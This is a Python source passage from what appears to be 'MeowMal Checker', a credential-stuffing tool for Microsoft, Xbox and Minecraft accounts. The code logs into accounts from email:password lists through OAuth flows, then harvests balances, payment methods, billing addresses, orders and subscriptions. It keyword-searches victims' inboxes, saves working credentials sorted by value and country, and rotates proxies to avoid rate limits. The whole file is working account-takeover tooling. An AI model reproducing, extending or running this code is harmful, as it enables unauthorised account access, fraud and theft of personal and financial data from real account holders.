            token = self.get_auth_token('0000000048170EF2', 'service::outlook.office.com::MBI_SSL', 'https://login.live.com/oauth20_desktop.srf')
        if token:
            self._graph_token = token
        return token
    def check_subscriptions(self):
        try:
            r = self.session.get('https://account.microsoft.com/services/api/subscriptions', timeout=15)
            subs = []
            if r.status_code == 200:
                try:
                    data = r.json()
                    for item in data:
                        if item.get('status') == 'Active':
                            name = item.get('productName', 'Unknown Subscription')
                            recurrence = item.get('recurrenceState', '')
                            subs.append(f'{name} ({recurrence})')
                except:
                    pass
            return subs
        except Exception:
            return []
    def check_billing_address(self):
        try:
            r = self.session.get('https://account.microsoft.com/billing/api/addresses', timeout=15)
            addresses = []
            if r.status_code == 200:
                try:
                    data = r.json()
                    for item in data:
                        line1 = item.get('line1', '')
                        city = item.get('city', '')
                        postal = item.get('postalCode', '')
                        country = item.get('country', '')
                        if line1:
                            addresses.append(f'{line1}, {city}, {postal}, {country}')
                except:
                    pass
            return addresses
        except Exception:
            return []
    def check_order_history(self):
        try:
            r = self.session.get('https://account.microsoft.com/orders/api/history', timeout=12)
            orders = []
            if r.status_code == 200:
                try:
                    data = r.json()
                    for item in data.get('orders', []):
                        desc = item.get('description', '') or item.get('title', '')
                        if desc:
                            orders.append(desc)
                except Exception:
                    pass
            return orders
        except Exception:
            return []
    def check_country(self):

        country = "Unknown"
        displayName = "Unknown"


        try:
            token = self.get_graph_token()
            if token:
                headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
                r = self.session.get("https://graph.microsoft.com/v1.0/me", headers=headers, timeout=8)
                if r.status_code == 200:
                    data = r.json()
                    country = data.get("country", data.get("mobilePhone", "Unknown"))
                    displayName = data.get("displayName", "Unknown")
                    if not country or country == "Unknown":
                        r2 = self.session.get("https://graph.microsoft.com/v1.0/me/mailboxSettings", headers=headers, timeout=8)
                        if r2.status_code == 200:
                            country = r2.json().get("timeZone", "Unknown")
        except Exception:
            pass


        if not country or country == "Unknown":
            try:
                sub_token = self.get_auth_token('0000000048170EF2', 'https://substrate.office.com/User-Internal.ReadWrite', 'https://login.live.com/oauth20_desktop.srf')
                if not sub_token:
                    sub_token = self.get_auth_token('0000000048170EF2', 'service::outlook.office.com::MBI_SSL', 'https://login.live.com/oauth20_desktop.srf')
                if sub_token:
                    cid = self.session.cookies.get("MSPCID", self.email)
                    headers = {
                        "Authorization": f"Bearer {sub_token}",
                        "X-AnchorMailbox": f"CID:{cid}",
                        "Content-Type": "application/json",
                        "User-Agent": "Outlook-Android/2.0",
                        "Accept": "application/json"
                    }
                    r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=8)
                    if r.status_code == 200:
                        data = r.json()
                        country = data.get("accounts", [{}])[0].get("location", "Unknown")
                        if displayName == "Unknown":
                            displayName = data.get("names", [{}])[0].get("displayName", "Unknown")
            except Exception:
                pass


        if not country or country == "Unknown":
            try:
                r_prof = self.session.get("https://account.microsoft.com/api/account/profile", headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Referer": "https://account.microsoft.com/"}, timeout=8)
                if r_prof.status_code == 200:
                    d = r_prof.json()
                    for k in ["CountryCode", "countryCode", "country", "Country", "usercountry"]:
                        if k in d and d[k] and len(str(d[k])) >= 2:
                            country = str(d[k])
                            break
            except Exception:
                pass


        if not country or country == "Unknown":
            try:
                jwt_cookie = self.session.cookies.get("AMCSecAuthJWT", "")
                if jwt_cookie and "." in jwt_cookie:
                    payload = jwt_cookie.split(".")[1]
                    import base64
                    padded = payload + "=" * ((4 - len(payload) % 4) % 4)
                    claims = json.loads(base64.urlsafe_b64decode(padded.encode()).decode("utf-8", "ignore"))
                    ctry = claims.get("ctry") or claims.get("country")
                    if ctry:
                        country = str(ctry)
            except Exception:
                pass


        if not country or country == "Unknown":
            try:
                domain = self.email.split("@")[-1].lower()
                tld_map = {
                    ".jp": "Japan", ".co.jp": "Japan",
                    ".de": "Germany",
                    ".uk": "United_Kingdom", ".co.uk": "United_Kingdom",
                    ".fr": "France",
                    ".it": "Italy",
                    ".es": "Spain",
                    ".ca": "Canada",
                    ".au": "Australia", ".com.au": "Australia",
                    ".br": "Brazil", ".com.br": "Brazil",
                    ".ru": "Russia",
                    ".in": "India", ".co.in": "India",
                    ".nl": "Netherlands",
                    ".se": "Sweden",
                    ".no": "Norway",
                    ".dk": "Denmark",
                    ".fi": "Finland",
                    ".pl": "Poland",
                    ".tr": "Turkey", ".com.tr": "Turkey",
                    ".mx": "Mexico", ".com.mx": "Mexico",
                    ".ar": "Argentina", ".com.ar": "Argentina",
                    ".ch": "Switzerland",
                    ".at": "Austria",
                    ".be": "Belgium",
                    ".nz": "New_Zealand", ".co.nz": "New_Zealand",
                    ".sg": "Singapore", ".com.sg": "Singapore",
                    ".za": "South_Africa", ".co.za": "South_Africa"
                }
                for tld, c_name in tld_map.items():
                    if domain.endswith(tld):
                        country = c_name
                        break
            except Exception:
                pass

        formatted_country = format_country_name(country)
        if formatted_country and formatted_country != "Unknown":
            try:
                write_dedupe(self.fname, f'Country/{formatted_country}.txt', f'{self.email}:{self.password}\n')
            except Exception:
                pass
        return formatted_country

    def check_inbox(self, keywords):
        
        try:
            token = self.get_graph_token()
            results = []
            if token:
                headers = {
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0",
                    "ConsistencyLevel": "eventual"
                }
                def _search_one(kw):
                    try:
                        q = f'https://graph.microsoft.com/v1.0/me/messages?$search="subject:{kw}"&$select=subject,receivedDateTime&$top=25'
                        r = self.session.get(q, headers=headers, timeout=8)
                        if r.status_code == 200:
                            data = r.json()
                            n = data.get("@odata.count", 0)
                            if n == 0 and "value" in data:
                                n = len(data["value"])
                            if n > 0:
                                return kw, n

                        q2 = f'https://graph.microsoft.com/v1.0/me/messages?$search="{kw}"&$select=subject,receivedDateTime&$top=25'
                        r2 = self.session.get(q2, headers=headers, timeout=8)
                        if r2.status_code == 200:
                            data2 = r2.json()
                            n2 = data2.get("@odata.count", 0)
                            if n2 == 0 and "value" in data2:
                                n2 = len(data2["value"])
                            if n2 > 0:
                                return kw, n2
                    except Exception:
                        pass
                    return None

                with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(keywords), 8)) as executor:
                    futures = [executor.submit(_search_one, kw) for kw in keywords if kw]
                    for f in concurrent.futures.as_completed(futures):
                        res = f.result()
                        if res:
                            results.append(res)


            if not results:
                try:
                    try:
                        self.session.get("https://outlook.live.com/owa/", timeout=6)
                    except Exception:
                        pass
                    sub_token = self.get_auth_token('0000000048170EF2', 'https://substrate.office.com/User-Internal.ReadWrite', 'https://login.live.com/oauth20_desktop.srf')
                    if not sub_token:
                        sub_token = self.get_auth_token('0000000048170EF2', 'service::outlook.office.com::MBI_SSL', 'https://login.live.com/oauth20_desktop.srf')
                    if sub_token:
                        cid = self.session.cookies.get('MSPCID', self.email)
                        sub_headers = {'Authorization': f'Bearer {sub_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
                        for kw in keywords:
                            try:
                                payload = {'Cvid': str(uuid.uuid4()), 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'UTC', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Conversation', 'ContentSources': ['Exchange'], 'From': 0, 'Query': {'QueryString': kw}, 'Size': 25}], 'LogicalId': str(uuid.uuid4())}
                                r = self.session.post('https://outlook.live.com/search/api/v2/query?n=124', json=payload, headers=sub_headers, timeout=8)
                                if r.status_code == 200:
                                    d = r.json()
                                    found = 0
                                    for es in d.get('EntitySets', []):
                                        for rs in es.get('ResultSets', []):
                                            found += rs.get('Total', len(rs.get('Results', [])))
                                    if found > 0:
                                        results.append((kw, found))
                            except Exception:
                                pass
                except Exception:
                    pass

            return results
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f"Inbox Searcher Error: {str(e)[:50]}")
            return []

COUNTRY_NAMES = {
    "US": "United_States", "USA": "United_States", "UNITED STATES": "United_States",
    "IN": "India", "INDIA": "India",
    "DE": "Germany", "GERMANY": "Germany",
    "GB": "United_Kingdom", "UK": "United_Kingdom", "GREAT BRITAIN": "United_Kingdom",
    "CA": "Canada", "CANADA": "Canada",
    "AU": "Australia", "AUSTRALIA": "Australia",
    "FR": "France", "FRANCE": "France",
    "IT": "Italy", "ITALY": "Italy",
    "ES": "Spain", "SPAIN": "Spain",
    "BR": "Brazil", "BRAZIL": "Brazil",
    "JP": "Japan", "JAPAN": "Japan",
    "KR": "South_Korea", "KOREA": "South_Korea",
    "CN": "China", "CHINA": "China",
    "RU": "Russia", "RUSSIA": "Russia",
    "MX": "Mexico", "MEXICO": "Mexico",
    "NL": "Netherlands", "NETHERLANDS": "Netherlands",
    "SE": "Sweden", "SWEDEN": "Sweden",
    "NO": "Norway", "NORWAY": "Norway",
    "DK": "Denmark", "DENMARK": "Denmark",
    "FI": "Finland", "FINLAND": "Finland",
    "PL": "Poland", "POLAND": "Poland",
    "TR": "Turkey", "TURKEY": "Turkey", "TURKIYE": "Turkey",
    "SA": "Saudi_Arabia", "SAUDI ARABIA": "Saudi_Arabia",
    "AE": "United_Arab_Emirates", "UAE": "United_Arab_Emirates",
    "SG": "Singapore", "SINGAPORE": "Singapore",
    "MY": "Malaysia", "MALAYSIA": "Malaysia",
    "ID": "Indonesia", "INDONESIA": "Indonesia",
    "TH": "Thailand", "THAILAND": "Thailand",
    "VN": "Vietnam", "VIETNAM": "Vietnam",
    "PH": "Philippines", "PHILIPPINES": "Philippines",
    "AR": "Argentina", "ARGENTINA": "Argentina",
    "CL": "Chile", "CHILE": "Chile",
    "ZA": "South_Africa", "SOUTH AFRICA": "South_Africa",
    "NZ": "New_Zealand", "NEW ZEALAND": "New_Zealand",
    "IE": "Ireland", "IRELAND": "Ireland",
    "CH": "Switzerland", "SWITZERLAND": "Switzerland",
    "AT": "Austria", "AUSTRIA": "Austria",
    "BE": "Belgium", "BELGIUM": "Belgium",
    "PT": "Portugal", "PORTUGAL": "Portugal",
    "GR": "Greece", "GREECE": "Greece",
    "CZ": "Czech_Republic", "CZECH REPUBLIC": "Czech_Republic",
    "HU": "Hungary", "HUNGARY": "Hungary",
    "RO": "Romania", "ROMANIA": "Romania",
    "UA": "Ukraine", "UKRAINE": "Ukraine",
    "IL": "Israel", "ISRAEL": "Israel"
}

def format_country_name(raw_country):
    if not raw_country or raw_country == "Unknown":
        return "Unknown"
    cleaned = str(raw_country).strip().upper()
    if cleaned in COUNTRY_NAMES:
        return COUNTRY_NAMES[cleaned]
    words = re.split(r'[\s_]+', str(raw_country).strip())
    clean_words = ["".join([c for c in w if c.isalnum()]) for w in words if w]
    if clean_words:
        return "_".join([w.capitalize() for w in clean_words])
    return "Unknown"

def check_microsoft_account(session, email, password, config, fname):
    try:
        checker = MicrosoftChecker(session, email, password, config, fname)
        results = {}

        def check_balance():
            if config.get('check_microsoft_balance'):
                balance = checker.check_balance()
                if balance:
                    try:
                        amount_str = re.sub('[^\\d\\.]', '', str(balance))
                        if amount_str and float(amount_str) > 0:
                            bal_line = f'{email}:{password} | Balance: {balance}\n'
                            write_dedupe(fname, 'balance.txt', bal_line)
                            return ('balance', balance)
                    except Exception:
                        pass
            return None
        def check_rewards():
            if config.get('check_rewards_points', True):
                points = checker.check_rewards_points()
                if points:
                    pts_line = f'{email}:{password} | Points: {points}\n'
                    write_dedupe(fname, 'point.txt', pts_line)
                    return ('rewards_points', points)
            return None
        def check_payment():
            if config.get('check_payment_methods') or config.get('check_credit_cards') or config.get('check_paypal'):
                instruments = checker.check_payment_instruments()
                if instruments:
                    card_line = f"{email}:{password} | {'; '.join(instruments)}\n"
                    write_dedupe(fname, 'payment.txt', card_line)
                    return ('payment_methods', instruments)
            return None
        def check_subs():
            if config.get('check_subscriptions'):
                subs = checker.check_subscriptions()
                if subs:
                    write_dedupe(fname, 'Subscriptions.txt', f"{email}:{password} | Subs: {', '.join(subs)}\n")
                    return ('subscriptions', subs)
            return None
        def check_orders():
            if config.get('check_orders') or config.get('check_purchase_history'):
                orders = checker.check_order_history()
                if orders:
                    block = f'{email}:{password}\n'
                    for order in orders:
                        block += f'  - {order}\n'
                    block += '----------------------------------------\n'
                    write_dedupe(fname, 'Order_History.txt', block)
                    return ('orders', orders)
            return None
        def check_billing():
            if config.get('check_billing_address'):
                addresses = checker.check_billing_address()
                if addresses:
                    write_dedupe(fname, 'Billing_Addresses.txt', f"{email}:{password} | Address: {'; '.join(addresses)}\n")
                    return ('billing_addresses', addresses)
            return None
        def check_inbox():
            if config.get('scan_inbox', True):
                keywords_str = config.get('inbox_keywords', '')
                if keywords_str and isinstance(keywords_str, str) and keywords_str.strip():
                    keywords = [k.strip() for k in keywords_str.split(',') if k.strip()]
                else:
                    keywords = ["steam", "netflix", "Crunchyroll", "discord", "microsoft", "nordvpn"]
                inbox_results = checker.check_inbox(keywords)
                if inbox_results:
                    for keyword, match_count in inbox_results:
                        if match_count and int(match_count) > 0:
                            clean_kw = "".join([c for c in str(keyword) if c.isalnum() or c in (' ', '_', '-')]).strip()
                            safe_keyword = clean_kw.title().replace(' ', '_') if clean_kw else "Search_Hit"
                            write_dedupe(fname, f'Inboxes/{safe_keyword}.txt', f'{email}:{password}\n')
                    formatted_results = ', '.join([f'{k} ({v})' for k, v in inbox_results])
                    write_dedupe(fname, 'Inbox.txt', f'{email}:{password} | Inbox - {formatted_results}\n')
                    return ('inbox_results', inbox_results)
            return None

        try:
            r = check_balance()
            if r: results[r[0]] = r[1]
        except: pass
        try:
            r = check_rewards()
            if r: results[r[0]] = r[1]
        except: pass
        try:
            r = check_payment()
            if r: results[r[0]] = r[1]
        except: pass
        try:
            r = check_subs()
            if r: results[r[0]] = r[1]
        except: pass
        try:
            r = check_orders()
            if r: results[r[0]] = r[1]
        except: pass
        try:
            r = check_billing()
            if r: results[r[0]] = r[1]
        except: pass
        try:
            r = check_inbox()
            if r: results[r[0]] = r[1]
        except: pass
        
        return results
    except (OSError, IOError, PermissionError) as e:
        return {'balance': None}
    except Exception as e:
        return {'balance': None}
class ConfigLoader:
    def __init__(self, config_file='config.ini'):
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.settings = {}
        self._config_cache = None
        self._cache_timestamp = 0
        self._cache_timeout = 60
        self.load_config()
    def load_config(self):
        current_time = time.time()
        if self._config_cache is not None and current_time - self._cache_timestamp < self._cache_timeout and os.path.exists(self.config_file):
            self.settings = self._config_cache.copy()
            return True
        if not os.path.exists(self.config_file):
            self.create_default_config()
            return False
        try:
            self.config.read(self.config_file, encoding='utf-8')
            self.update_config_schema()
            self.parse_all_sections()
            self._config_cache = self.settings.copy()
            self._cache_timestamp = current_time
            return True
        except (configparser.Error, IOError, OSError):
            self.create_default_config()
            return False
    def create_default_config(self):
        self.settings = {'max_retries': 4, 'timeout': 15, 'threads': 100, 'use_proxies': False, 'check_xbox_game_pass': True, 'check_minecraft_ownership': True, 'check_hypixel_rank': True, 'check_payment': False, 'auto_proxy': False, 'proxy_api': '', 'request_num': 3, 'proxy_time': 5, 'check_microsoft_balance': False, 'check_rewards_points': False, 'check_payment_methods': False, 'check_subscriptions': False, 'check_orders': False, 'check_billing_address': False, 'scan_inbox': True, 'save_bad': False, 'inbox_keywords': 'Microsoft,Steam,Xbox,Game Pass,Purchase,Order,Confirmation,Receipt,Payment'}
        self.config = configparser.ConfigParser()
        self.update_config_schema()
        print(f'{Fore.GREEN}✓ Created default configuration file: {self.config_file}{Fore.RESET}')
    def update_config_schema(self):
        defaults = {
            'General': {
                'threads': '100',
                'timeout': '15',
                'max_retries': '4',
                'use_proxies': 'False'
            },
            'Performance': {
                'optimize_network': 'True',
                'connection_pool_size': '100',
                'dns_cache_enabled': 'True',
                'keep_alive_enabled': 'True'
            },
            'Proxy': {
                'Auto_Proxy': 'False',
                'Proxy_Api': '',
                'Request_Num': '3',
                'Proxy_Time': '5',
                'proxy_rotation': 'True',
                'verify_ssl': 'False'
            },
            'Features': {
                'check_xbox_game_pass': 'True',
                'check_xbox_game_pass_ultimate': 'True',
                'check_minecraft_ownership': 'True',
                'check_minecraft_capes': 'True',
                'check_optifine_cape': 'True',
                'check_name_change': 'True',
                'check_last_name_change': 'True',
                'check_hypixel_rank': 'True',
                'check_hypixel_level': 'True',
                'check_hypixel_first_login': 'True',
                'check_hypixel_last_login': 'True',
                'check_hypixel_ban_status': 'True',
                'check_bedwars_stars': 'True',
                'check_skyblock_coins': 'True',
                'check_skyblock_networth': 'True',
                'check_payment': 'False',
                'check_credit_cards': 'False',
                'check_paypal': 'False',
                'check_billing_address': 'False',
                'check_subscriptions': 'False',
                'check_purchase_history': 'False',
                'check_microsoft_balance': 'False',
                'check_reward_points': 'False',
                'check_orders': 'False',
                'check_payment_methods': 'False',

                'check_email_access': 'True',
                'check_two_factor': 'True'
            },
            'Inbox': {
                'scan_inbox': 'True',
                'inbox_keywords': 'steam, netflix, Crunchyroll',
                'max_inbox_messages': '50',
                'save_full_emails': 'False'
            },
            'BanChecking': {
                'enable_ban_checking': 'True',
                'hypixelban': 'True',
                'use_ban_proxies': 'False'
            },
            'Data_Collection': {
                'hypixel_name': 'True',
                'hypixel_level': 'True',
                'first_hypixel_login': 'True',
                'last_hypixel_login': 'True',
                'optifine_cape': 'True',
                'minecraft_capes': 'True',
                'email_access': 'True',
                'hypixel_skyblock_coins': 'True',
                'hypixel_bedwars_stars': 'True',
                'hypixel_ban': 'True',
                'name_change_availability': 'True',
                'last_name_change': 'True',
                'payment': 'False'
            },
            'File_Output': {
                'save_hits': 'True',
                'save_bad': 'True',
                'save_valid_mail': 'True',
                'save_2fa': 'True',
                'save_banned': 'True',
                'save_unbanned': 'True',
                'save_mfa': 'True',
                'save_sfa': 'True',
                'save_normal_minecraft': 'True',
                'save_xbox_game_pass': 'True',
                'save_xbox_game_pass_ultimate': 'True',
                'save_other': 'True',
                'create_capture_file': 'True',
                'create_separate_files': 'True'
            },
            'Discord': {
                'enable_notifications': 'False',
                'discord_webhook_url': '',
                'webhook_username': 'MeowMal Checker',
                'webhook_avatar_url': 'https://i.imgur.com/4M34hi2.png',
                'notify_on_hit': 'True',
                'notify_on_game_pass': 'True',
                'notify_on_payment': 'False',
                'notify_on_2fa': 'False',
                'notify_on_mfa': 'True',
                'notify_on_hypixel_rank': 'True',
                'embed_color_hit': '#57F287',
                'embed_color_xgp': '#3498DB',
                'embed_thumbnail': 'True',
                'embed_footer': 'True',
                'embed_thumbnail_url': 'https://i.imgur.com/4M34hi2.png',
                'embed_image_enabled': 'True',
                'embed_image_template': 'https://hypixel.paniek.de/signature/{uuid}/general-tooltip'
            },
            'Security': {
                'mark_mfa': 'True',
                'mark_sfa': 'True'
            },
            'RateLimit': {
                'delay_between_checks': '0',
                'random_delay': 'True',
                'min_delay': '0',
                'max_delay': '2',
                'respect_429': 'True',
                'pause_on_429': '20',
                'random_user_agent': 'True',
                'warn_on_slow_check': 'False',
                'slow_check_warn_seconds': '75'
            },
            'Filters': {
                'min_hypixel_level': '0',
                'min_bedwars_stars': '0',
                'min_skyblock_coins': '0',
                'min_account_balance': '0',
                'require_payment_method': 'False',
                'require_full_access': 'False',
                'require_unbanned': 'False'
            },
            'AutoOps': {
                'auto_set_name': 'False',
                'custom_name_format': 'MeowMal_{random_letter}_{random_number}',
                'auto_set_skin': 'False',
                'skin_url': 'http://textures.minecraft.net/texture/example',
                'skin_variant': 'classic'
            },
            'DonutSMP': {
                'donut_stats': 'False',
                'donut_api_key': ''
            },
            'UI': {
                'show_live_logs': 'True',
                'print_to_console': 'True',
                'colored_output': 'True',
                'verbose_mode': 'False',
                'theme': 'blue'
            }
        }
        updated = False
        for section, options in defaults.items():
            if not self.config.has_section(section):
                self.config.add_section(section)
                updated = True
            for key, value in options.items():
                if not self.config.has_option(section, key):
                    self.config.set(section, key, str(value))
                    updated = True
        if updated:
            try:
                with open(self.config_file, 'w', encoding='utf-8') as f:
                    self.config.write(f)
                pass
            except Exception as e:
                print(f'{Fore.YELLOW}⚠ Could not update config schema: {e}{Fore.RESET}')
    def parse_all_sections(self):
        for section in self.config.sections():
            for key, value in self.config.items(section):
                try:
                    self.settings[key] = self.parse_value(value)
                except (ValueError, TypeError):
                    continue
    def parse_value(self, value):
        if not isinstance(value, str):
            return value
        value = value.strip()
        if value.lower() in ('true', 'yes', '1', 'on'):
            return True
        if value.lower() in ('false', 'no', '0', 'off'):
            return False
        try:
            if '.' not in value:
                return int(value)
            return float(value)
        except ValueError:
            pass
        return value
    def get(self, key, default=None):
        return self.settings.get(key, default)
    def get_proxy_config(self):
        return {'auto_proxy': self.get('auto_proxy', False), 'proxy_api': self.get('proxy_api', ''), 'request_num': self.get('request_num', 3), 'proxy_time': self.get('proxy_time', 5)}
    def get_checker_config(self):
        return {'hypixelname': self.get('check_hypixel_rank', True), 'hypixellevel': self.get('check_hypixel_level', True), 'hypixelfirstlogin': self.get('check_hypixel_first_login', True), 'hypixellastlogin': self.get('check_hypixel_last_login', True), 'hypixelban': self.get('check_hypixel_ban_status', True), 'hypixelbwstars': self.get('check_bedwars_stars', True), 'hypixelsbcoins': self.get('check_skyblock_coins', True), 'payment': self.get('check_payment', True), 'access': self.get('check_email_access', True), 'optifinecape': self.get('check_optifine_cape', True), 'namechange': self.get('check_name_change', True), 'lastchanged': self.get('check_last_name_change', True), 'setname': self.get('auto_set_name', False), 'name': self.get('custom_name_format', 'MeowMal'), 'setskin': self.get('auto_set_skin', False), 'skin': self.get('skin_url', 'http://textures.minecraft.net/texture/31f477eb1a7beee631c2ca64d06f8f68fa93a3386d04452ab27f43acdf1b60cb'), 'variant': self.get('skin_variant', 'classic'), 'mark_mfa': self.get('mark_mfa', True), 'mark_sfa': self.get('mark_sfa', True), 'donut_stats': self.get('donut_stats', True), 'donut_api_key': self.get('donut_api_key', ''), 'save_bad': self.get('save_bad', False)}
    def get_general_config(self):
        return {'max_retries': self.get('max_retries', 3), 'timeout': self.get('timeout', 15), 'threads': self.get('threads', 10), 'use_proxies': self.get('use_proxies', False)}
    def get_capture_config(self):
        return {'hypixel_name': self.get('hypixel_name', True), 'hypixel_level': self.get('hypixel_level', True), 'first_hypixel_login': self.get('first_hypixel_login', True), 'last_hypixel_login': self.get('last_hypixel_login', True), 'optifine_cape': self.get('optifine_cape', True), 'minecraft_capes': self.get('minecraft_capes', True), 'email_access': self.get('email_access', True), 'hypixel_skyblock_coins': self.get('hypixel_skyblock_coins', True), 'hypixel_bedwars_stars': self.get('hypixel_bedwars_stars', True), 'hypixel_ban': self.get('hypixel_ban', True), 'name_change_availability': self.get('name_change_availability', True), 'last_name_change': self.get('last_name_change', True), 'payment': self.get('payment', True), 'donut_stats': self.get('donut_stats', True)}
sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
Combos = []
proxylist = []
banproxies = []
fname = ''
screen = "'2'"
proxytype = "'4'"
proxy_api_url = ''
auto_proxy = False
proxy_request_num = 3
proxy_time = 5
last_proxy_fetch = 0
proxy_refresh_time = 5
DONUT_API_URL = 'https://api.donutsmp.net/v1/stats/'
api_socks4 = ['https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text', 'https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt', 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt']
api_socks5 = ['https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text', 'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt', 'https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt', 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt']
api_http = ['https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt', 'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt']
hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm, sfa, mfa, maxretries, xgp, xgpu, other, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, automarklost = (0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0)
autopay_count = 0
stats_lock = threading.Lock()
urllib3.disable_warnings()
warnings.filterwarnings('ignore')
def is_no_proxy():
    pt = str(proxytype).strip()
    pt = pt.replace("'", '').replace('"', '')
    return pt == '4'
class Config:
    def __init__(self):
        self.data = {}
        try:
            cfg = ConfigLoader('config.ini')
            cfg.parse_all_sections()
            for k, v in cfg.settings.items():
                self.data[k] = v
        except Exception:
            pass
    def set(self, key, value):
        self.data[key] = value
    def get(self, key, default=None):
        return self.data.get(key, default)
config = Config()
class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.namechange_available = None
        self.lastchanged = None
        self.ms_balance = None
        self.ms_rewards = None
        self.ms_orders = []
        self.ms_payment_methods = []
        self.inbox_matches = []
        self.ban_checked = False
        self.country = 'Unknown'
        self.sbnetworth = None
        self.swstars = None
        self.pitcoins = None
        self.dungeons = None
    def builder(self, mask_password=False, include_timestamp=False):
        if self.banned is None:
            ban_status = '[Unknown]'
        elif str(self.banned).startswith('[Error]'):
            ban_status = '[Unknown]'
        elif self.banned and self.banned != 'False':
            ban_status = '[Banned]'
        else:
            ban_status = '[Unbanned]'
        tags = []
        if self.type:
            type_upper = str(self.type).upper()
            if 'GAME PASS' in type_upper or 'XGP' in type_upper:
                if 'ULTIMATE' in type_upper or 'XGPU' in type_upper:
                    tags.append('[XGPU]')
                else:
                    tags.append('[XGP]')
            if 'MINECRAFT' in type_upper or 'MC' in type_upper:
                tags.append('[MC]')
        if hasattr(self, 'sfa') and self.sfa:
            tags.append('[SFA]')
        if 'NFA' in str(self.type):
            tags.append('[NFA]')
        elif 'SFA' in str(self.type):
            tags.append('[SFA]')
        elif 'UFA' in str(self.type):
            tags.append('[UFA]')
        if self.capes and self.capes != '':
            tags.append(f'[{self.capes}]')
        if self.cape and self.cape == 'Yes':
            tags.append('[Optifine]')
        if hasattr(self, 'sbcoins') and self.sbcoins or (hasattr(self, 'sbnetworth') and self.sbnetworth):
            tags.append('[Skyblock]')
        if hasattr(self, 'swstars') and self.swstars:
            tags.append('[SkyWars]')
        if hasattr(self, 'dungeons') and self.dungeons:
            tags.append('[Dungeons]')
        hypixel_level = ''
        if self.level and float(self.level) > 0:
            hypixel_level = f'[Lvl:{self.level}]'
        if mask_password:
            if len(self.password) > 4:
                password_display = self.password[:2] + '*' * (len(self.password) - 4) + self.password[-2:]
            else:
                password_display = '*' * len(self.password)
        else:
            password_display = self.password
        stats_parts = []
        if self.bwstars and int(self.bwstars) > 0:
            stats_parts.append(f'BW: {self.bwstars}')
        if hasattr(self, 'swstars') and self.swstars and (str(self.swstars) not in ('N/A', '', '0')) and (int(self.swstars) > 0):
            stats_parts.append(f'SW: {self.swstars}')
        if hasattr(self, 'sbcoins') and self.sbcoins and (str(self.sbcoins) not in ('N/A', '', 'None')):
            stats_parts.append(f'Sb_Coins: {self.sbcoins}')
        if hasattr(self, 'sbnetworth') and self.sbnetworth and (str(self.sbnetworth) not in ('N/A', '', 'None')):
            stats_parts.append(f'Sb_Networth: {self.sbnetworth}')
        if hasattr(self, 'pitcoins') and self.pitcoins and (str(self.pitcoins) not in ('N/A', '', 'None')):
            stats_parts.append(f'Pit_Coins: {self.pitcoins}')
        tags_str = ''.join(tags)
        stats_str = ', '.join(stats_parts) if stats_parts else ''
        if self.hypixl and self.hypixl != 'N/A':
            user_display = self.hypixl
        elif self.name and self.name != 'N/A':
            user_display = self.name
        else:
            user_display = 'NoMC'
        capture_line = f'[{user_display}] {ban_status} {tags_str}{hypixel_level} {self.email}:{password_display}'
        if include_timestamp:
            import time
            from datetime import datetime
            if hasattr(ui, 'start_time') and ui.start_time:
                elapsed = time.time() - ui.start_time
                hours = int(elapsed // 3600)
                minutes = int(elapsed % 3600 // 60)
                seconds = int(elapsed % 60)
                elapsed_time = f'[{hours:02d}:{minutes:02d}:{seconds:02d}]'
            else:
                elapsed_time = '[00:00:00]'
            capture_line = f'{elapsed_time} {capture_line}'
        if stats_str:
            capture_line += f' [Hypixel: {stats_str}]'
        return capture_line
    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') or config.get('hypixellevel') or config.get('hypixelfirstlogin') or config.get('hypixellastlogin') or config.get('hypixelbwstars'):
                try:
                    proxy_to_use = getproxy() if not is_no_proxy() else None
                    resp = self.session.get('https://plancke.io/hypixel/player/stats/' + self.name, proxies=proxy_to_use, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept-Encoding': 'gzip, deflate'}, verify=False, timeout=(5, 8))
                    tx = resp.text
                except Exception:
                    raise
                try:
                    if config.get('hypixelname'):
                        match = HYPIXEL_NAME.search(tx)
                        if match:
                            self.hypixl = match.group()
                            match_title = HYPIXEL_TITLE.search(tx)
                            if match_title:
                                self.hypixl = match_title.group(1)
